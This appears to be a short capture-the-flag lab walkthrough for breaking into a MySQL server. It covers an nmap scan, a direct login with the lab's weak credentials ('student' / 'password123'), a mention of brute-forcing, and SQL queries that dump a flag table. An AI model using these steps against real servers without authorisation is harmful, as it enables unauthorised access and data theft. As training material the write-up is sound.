## MySQL Weak Password Walkthrough

1.  **Enumeration:** A port scan (`nmap <TARGET_IP>`) reveals that port 3306 (MySQL) is open to the network.
2.  **Attack:** An attacker would typically attempt to brute-force common usernames and passwords. In this lab, we know the user is `student` and the password is weak. We can connect directly.
    ```bash
    # Note: The --skip-ssl flag may be needed depending on the client version
    mysql -h <TARGET_IP> -u student -p --skip-ssl
    ```
3.  **Authentication:** When prompted, enter the weak password: `password123`.
4.  **Looting:** Once connected to the database, enumerate its contents to find the flag.
    ```sql
    -- Show all available databases
    show databases;

    -- Switch to the interesting database
    use secrets;

    -- Show tables in the current database
    show tables;

    -- Dump the contents of the table to find the flag
    select * from flag_table;
    ```

